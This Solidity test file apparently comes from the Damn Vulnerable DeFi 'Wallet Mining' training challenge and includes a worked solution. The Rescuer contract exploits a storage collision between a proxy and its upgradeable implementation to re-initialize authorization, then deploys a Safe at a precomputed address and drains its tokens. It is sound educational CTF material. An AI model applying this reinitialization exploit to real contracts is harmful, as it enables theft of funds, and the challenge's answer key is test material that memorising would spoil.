// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        // Deploy Safe Singleton Factory contract using signed transaction
        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        // Deploy CreateX contract using signed transaction
        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                initCode: type(AuthorizerFactory).creationCode
            })
        );
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                initCode: bytes.concat(
                    type(WalletDeployer).creationCode,
                    abi.encode(address(token), address(proxyFactory), address(singletonCopy), deployer) // constructor args are appended at the end of creation code
                )
            })
        );

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with initial tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        console.log("User address:", user);

        // Find the `nonce` to deploy the Safe wallet at USER_DEPOSIT_ADDRESS
        // Note this `nonce` is a parameter used by the SafeProxyFactory#createProxyWithNonce function,
        // Play with https://app.safe.global/ in testnet to understand how to deploy a Safe wallet
        address[] memory owners = new address[](1);
        owners[0] = user;
        // Initializer for the Safe contract:
        // - Must call setup and using the default parameters are important.
        bytes memory initializer = abi.encodeWithSignature(
                                                           "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                                                           owners,     // owners
                                                           1,          // threshold
                                                           address(0), // optional delegateCall to
                                                           bytes(""),  // data for the optional delegateCall
                                                           address(0), // fallbackHandler
                                                           address(0), // paymentToken
                                                           0,          // payment
                                                           address(0)  // paymentReceiver
        );

        uint256 nonce = 0;
        bytes memory deploymentData = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))));
        bytes32 initCodeHash = keccak256(deploymentData);

        for (; ; nonce++){
            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
            // computeCreate2Address(bytes32 salt, bytes32 initCodeHash, address deployer)
            address safeAddress = vm.computeCreate2Address(salt, initCodeHash, address(proxyFactory));

            if (safeAddress == USER_DEPOSIT_ADDRESS) {
                console.log("Found target address with nonce:", nonce);
                break;
            }
        }

        // Construct the transaction data to transfer tokens from USER_DEPOSIT_ADDRESS to the user after the Safe wallet is deployed
        bytes memory execData = abi.encodeWithSignature("transfer(address,uint256)", user, DEPOSIT_TOKEN_AMOUNT);

        // // 1/2 If we just want the token inside the Safe, not in the WalletDeployer, we can create the Safe wallet directly,
        // // You can uncomment the code below and simulate the transaction to get the txHash or even signatures, and don't have to reconstruct and compute the txHash manually
        // SafeProxy userSafe = proxyFactory.createProxyWithNonce(
        //     address(singletonCopy),
        //     initializer,
        //     nonce
        // );

        // bytes32 txHash = Safe(payable(USER_DEPOSIT_ADDRESS)).getTransactionHash(
        //                                                                          address(token),      // to
        //                                                                          0,                   // value
        //                                                                          execData,            // data
        //                                                                          Enum.Operation.Call, // operation
        //                                                                          0,                   // safeTxGas
        //                                                                          0,                   // baseGas
        //                                                                          0,                   // gasPrice
        //                                                                          address(0),          // gasToken
        //                                                                          payable(0),          // refundReceiver
        //                                                                          0
        // );
        // =>
        // bytes32 txHash = 0x8fd85e9889830254291199952e406818a81d1cf0aa324a0e6db76a1cf8a1fbfb;

        bytes32 txHash;
        bytes memory singatures;

        // Compute the txHash following CompatibilityFallbackHandler#encodeTransactionData or Safe#getTransactionHash (both are the same)
        {
            bytes32 DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;
            bytes32 SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;

            bytes32 execDataHash = keccak256(execData);
            bytes32 safeTxHash = keccak256(abi.encode(
                                                      SAFE_TX_TYPEHASH,
                                                      address(token),
                                                      uint256(0), // value
                                                      execDataHash,
                                                      Enum.Operation.Call,
                                                      uint256(0), // safeTxGas
                                                      uint256(0), // baseGas
                                                      uint256(0), // gasPrice
                                                      address(0), // gasToken
                                                      payable(0),  // refundReceiver
                                                      uint256(0) // nonce parameter of the newly created Safe wallet, any unused value is fine
                                           ));

            bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, uint256(block.chainid), USER_DEPOSIT_ADDRESS));

            assertEq(
                     0x702df831b7f3f3971e9493ad7756d8b5457c020e0e9712294726c884f53228ca,
                     domainSeparator,
                     "Domain separator mismatch"
            );

            txHash = keccak256(abi.encodePacked(bytes2(0x1901), domainSeparator, safeTxHash));
            // assertEq(txHash, 0x8fd85e9889830254291199952e406818a81d1cf0aa324a0e6db76a1cf8a1fbfb, "txHash mismatch");
        }

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
        singatures = abi.encodePacked(r, s, v);

        new Rescuer(
            token,
            authorizer,
            walletDeployer,
            nonce,
            initializer,
            execData,
            singatures,
            ward
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}


contract Rescuer {
    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    constructor(DamnValuableToken token,
                AuthorizerUpgradeable authorizer,
                WalletDeployer walletDeployer,
                uint256 nonce,
                bytes memory initializer,
                bytes memory execData,
                bytes memory singatures,
                address ward
    ){
        // 2/2. However we also want the reward from the wallet deployer, so we need to deploy through the walletDeployer contract
        // Exploit the storage conflict bewtween the AuthorizerUpgradeable#needsInit and the TransparentProxy contracts#upgrader
        console.log("Authorizer needsInit:", authorizer.needsInit());
        address[] memory wards= new address[](1);
        address[] memory aims = new address[](1);
        wards[0] = address(this);
        aims[0] = address(USER_DEPOSIT_ADDRESS);
        authorizer.init(wards, aims);
        require(authorizer.can(address(this), USER_DEPOSIT_ADDRESS), "Not authorized to get rewards");

        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce);

        require(USER_DEPOSIT_ADDRESS.code.length > 0, "Deploy contract to USER_DEPOSIT_ADDRESS failed");

        Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
            address(token),      // to
            0,                   // value
            execData,            // data
            Enum.Operation.Call, // operation
            0,                   // safeTxGas
            0,                   // baseGas
            0,                   // gasPrice
            address(0),          // gasToken
            payable(0),          // refundReceiver
            singatures           // signatures
        );

        token.transfer(ward, token.balanceOf(address(this)));
    }
}
